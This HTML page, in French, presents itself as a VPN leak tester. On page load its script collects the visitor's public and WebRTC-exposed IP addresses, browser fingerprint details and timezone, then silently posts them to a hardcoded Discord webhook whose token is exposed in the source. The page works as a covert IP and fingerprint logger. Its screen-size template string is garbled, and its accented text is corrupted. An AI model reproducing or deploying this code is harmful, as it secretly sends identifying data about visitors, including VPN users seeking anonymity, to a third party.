<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test VPN Avanc√© - D√©tection Fuites</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #1e1e1e; color: #eee; }
        h1 { color: #4caf50; }
        pre { background: #2d2d2d; padding: 20px; border-radius: 10px; white-space: pre-wrap; }
        .warning { color: #ff4444; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Test de Fuites VPN (D√©veloppement)</h1>
    <p>Collecte en cours... (IP, WebRTC, DNS, etc.)</p>
    <pre id="result">En attente des donn√©es...</pre>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1453526094484340807/Yxx2ikxrHe_y_hZejxwwxFxfBKISLKzV1RwcnjvzR4AovUqrrPtNSJ8xzgNm7dV6W2xZ";

        const info = {
            Timestamp: new Date().toISOString(),
            UserAgent: navigator.userAgent,
            Language: navigator.languages?.join(", ") || navigator.language,
            Platform: navigator.platform,
            Screen: `\( {screen.width}x \){screen.height}x${screen.colorDepth}`,
            Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            CookiesEnabled: navigator.cookieEnabled,
            DoNotTrack: navigator.doNotTrack,
            WebRTC_IPs: [],
            Public_IPs: {},
            DNS_Leak: []
        };

        // Envoi s√©curis√© vers Discord
        async function sendToDiscord() {
            try {
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "VPN Leak Tester",
                        embeds: [{
                            title: "üõ°Ô∏è Nouveau Test VPN",
                            color: info.WebRTC_IPs.length > 0 ? 15158332 : 3066993, // rouge si fuite WebRTC
                            fields: Object.entries(info).map(([key, value]) => ({
                                name: key,
                                value: typeof value === "object" ? 
                                    (Array.isArray(value) && value.length === 0 ? "Aucune d√©tect√©e" : value.join("\n")) :
                                    JSON.stringify(value, null, 2),
                                inline: key.includes("IP") || key === "DNS_Leak"
                            })),
                            footer: { text: "Test pour d√©veloppement VPN uniquement" },
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            } catch (e) {
                console.error("√âchec envoi Discord:", e);
                document.getElementById("result").textContent += "\n\n‚ö†Ô∏è Erreur envoi webhook Discord";
            }
        }

        // R√©cup√©ration IPs publiques (multiples sources pour fiabilit√©)
        async function fetchPublicIPs() {
            const services = [
                { name: "ipify IPv4", url: "https://api.ipify.org?format=json", parser: d => d.ip },
                { name: "ipify IPv6", url: "https://api6.ipify.org?format=json", parser: d => d.ip },
                { name: "icanhazip IPv4", url: "https://ipv4.icanhazip.com", parser: t => t.trim() },
                { name: "icanhazip IPv6", url: "https://ipv6.icanhazip.com", parser: t => t.trim() },
                { name: "ip-api", url: "https://ip-api.com/json/?fields=query", parser: d => d.query },
                { name: "cloudflare", url: "https://www.cloudflare.com/cdn-cgi/trace", parser: t => t.match(/ip=([^\n]+)/)?.[1] }
            ];

            for (const svc of services) {
                try {
                    const res = await fetch(svc.url, { cache: "no-store" });
                    if (res.ok) {
                        const text = await res.text();
                        const data = svc.url.includes("json") ? JSON.parse(text) : text;
                        info.Public_IPs[svc.name] = svc.parser(svc.url.includes("trace") ? text : data);
                    }
                } catch {} 
            }
        }

        // D√©tection fuites WebRTC (am√©lior√©e)
        function detectWebRTC() {
            return new Promise(resolve => {
                if (!window.RTCPeerConnection) {
                    resolve([]);
                    return;
                }

                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: "stun:stun.l.google.com:19302" },
                        { urls: "stun:stun1.l.google.com:19302" }
                    ]
                });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                const ips = new Set();
                pc.onicecandidate = e => {
                    if (!e.candidate?.candidate) return;
                    const match = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                    if (match) ips.add(match[1]);
                };

                setTimeout(() => {
                    pc.close();
                    resolve(Array.from(ips));
                }, 4000);
            });
        }

        // D√©tection fuite DNS simple (via WebRTC + hostname)
        async function detectDNSLeak() {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                await pc.createOffer().then(o => pc.setLocalDescription(o));
                return new Promise(resolve => {
                    pc.onicecandidate = ice => {
                        if (ice.candidate?.candidate) {
                            const host = ice.candidate.candidate.match(/host (.+?) /);
                            if (host) info.DNS_Leak.push(host[1]);
                        }
                    };
                    setTimeout(() => { pc.close(); resolve(); }, 3000);
                });
            } catch {}
        }

        // Lancement de tous les tests
        async function runTests() {
            await Promise.all([
                fetchPublicIPs(),
                detectDNSLeak()
            ]);

            info.WebRTC_IPs = await detectWebRTC();

            // Affichage final
            document.getElementById("result").textContent = JSON.stringify(info, null, 2);

            // Mise en √©vidence des fuites
            if (info.WebRTC_IPs.length > 0) {
                document.getElementById("result").innerHTML += 
                    "\n\n<span class='warning'>‚ö†Ô∏è FUITE WEBRTC D√âTECT√âE ! IPs r√©elles expos√©es !</span>";
            }

            // Envoi Discord
            sendToDiscord();
        }

        runTests();
    </script>
</body>
</html>
